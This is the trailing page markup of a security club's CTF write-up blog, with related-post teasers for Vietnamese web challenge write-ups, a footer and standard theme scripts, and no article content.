href="/tags/svattt2021/">SVATTT2021</a> <a class="post-tag" href="/tags/binary/">binary</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><h4 class="pl-3 pt-2 mb-2">Contents</h4><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/FuSec4-PRP201/"><div class="card-body"> <em class="timeago small" date="2021-10-10 23:30:00 +0700" >Oct 10</em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>FPTU SecAthon 2021 | Web Writeup | PRP201</h3><div class="text-muted small"><p> PRP201 Đây là challenge mà mình đã đoán được một phần, nhưng vẫn mất gần 1 ngày để giải ra :&amp;lt; Một sản phẩm đến từ anh Khoa (matuhn) Truy cập vào bài thì thấy có 5 đường dẫn đến 5 f...</p></div></div></a></div><div class="card"> <a href="/posts/FuSec4-PRP202/"><div class="card-body"> <em class="timeago small" date="2021-10-13 12:30:00 +0700" >Oct 13</em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>FPTU SecAthon 2021 | Web Writeup | PRP202</h3><div class="text-muted small"><p> PRP202 Một bài hay và cực khó với mình, chả trách người anh T giấu tên cứ bảo làm thử 2 ngày để làm, nhiều lần thất bại, nhưng kết quả thật xứng đáng Source code and analysis Source code Bắt...</p></div></div></a></div><div class="card"> <a href="/posts/SVATTT-Web/"><div class="card-body"> <em class="timeago small" date="2021-10-17 12:00:00 +0700" >Oct 17</em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>ASCIS (ASEAN Student Contest on Information Security) 's Web Write-ups</h3><div class="text-muted small"><p> Ở SVATTT 2021 năm nay thì team mình không vượt qua vòng lại, tuy nhiên cá nhân mình vẫn solve đc 2 bài web Script Kiddie và OProxy, coi như là một kỉ niệm lần đầu đi thi SVATTT có vui lẫn buồn. ...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/FuSec3-PRP301/" class="btn btn-outline-primary" prompt="Older"><p>FPTU SecAthon 2020 | MISC Writeup | PRP301</p></a> <a href="/posts/Information-Assurance-101/" class="btn btn-outline-primary" prompt="Newer"><p>Information Assurance 101</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center text-muted"><div class="footer-left"><p class="mb-0"> © 2021 <a href="https://github.com/FPTU-Ethical-Hackers-Club">FPTU Ethical Hackers' Club</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><h4 class="text-muted">Trending Tags</h4><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/writeups/">writeups</a> <a class="post-tag" href="/tags/web/">web</a> <a class="post-tag" href="/tags/wiki/">wiki</a> <a class="post-tag" href="/tags/fusec21/">fusec21</a> <a class="post-tag" href="/tags/cryptographic/">cryptographic</a> <a class="post-tag" href="/tags/fusec20/">fusec20</a> <a class="post-tag" href="/tags/forensics/">forensics</a> <a class="post-tag" href="/tags/acsc21/">acsc21</a> <a class="post-tag" href="/tags/svattt2021/">SVATTT2021</a> <a class="post-tag" href="/tags/binary/">binary</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><script src="https://cdn.jsdelivr.net/npm/mermaid@8/dist/mermaid.min.js"></script> <script> $(function() { let initTheme = "default"; if ($("html[mode=dark]").length > 0 || ($("html[mode]").length == 0 && window.matchMedia("(prefers-color-scheme: dark)").matches ) ) { initTheme = "dark"; } let mermaidConf = { theme: initTheme /* <default|dark|forest|neutral> */ }; /* Markdown converts to HTML */ $("pre").has("code.language-mermaid").each(function() { let svgCode = $(this).children().html(); $(this).addClass("unloaded"); $(this).after(`<div class=\"mermaid\">${svgCode}</div>`); }); mermaid.initialize(mermaidConf); }); </script><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.16.1,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id="></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', ''); }); </script>
